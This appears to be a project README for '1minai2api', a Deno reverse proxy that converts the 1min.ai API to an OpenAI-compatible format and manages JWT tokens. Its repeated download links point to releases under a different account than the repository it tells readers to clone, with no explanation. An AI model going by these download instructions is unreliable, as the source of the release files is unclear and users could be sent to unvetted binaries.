# 🌟 1minai2api - Your Easy OpenAI API Proxy

## 🚀 Download and Install

[![Download 1minai2api](https://img.shields.io/badge/Download-1minai2api-brightgreen)](https://github.com/Kelll114/1minai2api/releases)

1. **Visit the Releases Page**  
   Go to our [Releases page](https://github.com/Kelll114/1minai2api/releases) to download the latest version of 1minai2api.

2. **Choose Your File**  
   Select the appropriate file for your operating system and download it.

3. **Run the Application**  
   Once downloaded, follow the setup instructions below to run the application.

## 📖 About 1minai2api

1minai2api is a reverse proxy service that transforms the 1min.ai API into an OpenAI-compatible format. It supports JWT token management and automatic expiration detection.

### ✨ Key Features

- **OpenAI-Compatible API**: Offers an interface fully compatible with OpenAI Chat Completion formats.
- **JWT Token Management**: Easily add, enable, disable, or delete 1min.ai JWT tokens.
- **Token Annotations**: Add notes to each token for easier management.
- **Automatic Expiration Detection**: Smart detection that disables expired tokens automatically.
- **Deno Key-Value Storage**: Management through the built-in key-value storage database in Deno.
- **User Information Cache**: Reduces API requests by caching user data from 1min.ai.
- **Web Management Interface**: Friendly interface for easy token management.
- **Authentication Protection**: Independent keys safeguard API usage.

## 🚀 Getting Started

### 🔧 Prerequisites

Make sure you have Deno installed. You need version 1.40.0 or higher. You can download it from [Deno's official site](https://deno.land/).

### 📥 Install and Run

1. **Clone the Project**

   Open a terminal and run:

   ```bash
   git clone https://github.com/CassiopeiaCode/1minai2api.git
   cd 1minai2api
   ```

2. **Set Up Environment Variables**

   ```bash
   # Copy the environment variable template
   cp .env.example .env

   # Open the file .env and edit it
   # PORT=8000                                    # Set your server port
   # AUTH_SECRET=your-secret-key-here             # Your API authentication secret key
   ```

3. **Start the Service**

   To get started, run the following commands:

   ```bash
   # For development mode
   deno task dev

   # For production mode
   deno task start
   ```

   The service will start at `http://localhost:8000`.

## 📊 Using the Web Management Interface

Open your web browser and navigate to `http://localhost:8000` to access the web management interface. 

### 🌐 Features Available

- **Add New 1min.ai JWT Tokens**: Easily include new tokens.
- **View All Tokens**: Check the status of all tokens at a glance.
- **Enable/Disable Tokens**: Quickly manage the status of each token.

## 💡 Example Use Cases

1. **Integrate with Chatbots**: Use the OpenAI-compatible API to enhance chatbot functionalities.
2. **Manage Tokens Effectively**: Keep your JWT tokens organized and secure with the web interface.
3. **Monitor Token Status**: Automatically know which tokens are active and which are expired.

## 🔗 Additional Resources

- Visit the [GitHub Repository](https://github.com/Kelll114/1minai2api) for more information.
- Access our [Releases page](https://github.com/Kelll114/1minai2api/releases) for the latest downloads.

## 🔒 Security and Maintenance

Always keep your authentication secrets safe. Regularly update the application to stay secure with the latest features and fixes. For any issues or feature requests, visit the Issues section of our GitHub repository.

## 👍 Conclusion

1minai2api simplifies accessing the 1min.ai API with its OpenAI-compatible format. Set it up today and smoothly manage your tokens with ease. 

Once again, don’t forget to [download 1minai2api](https://github.com/Kelll114/1minai2api/releases) to get started.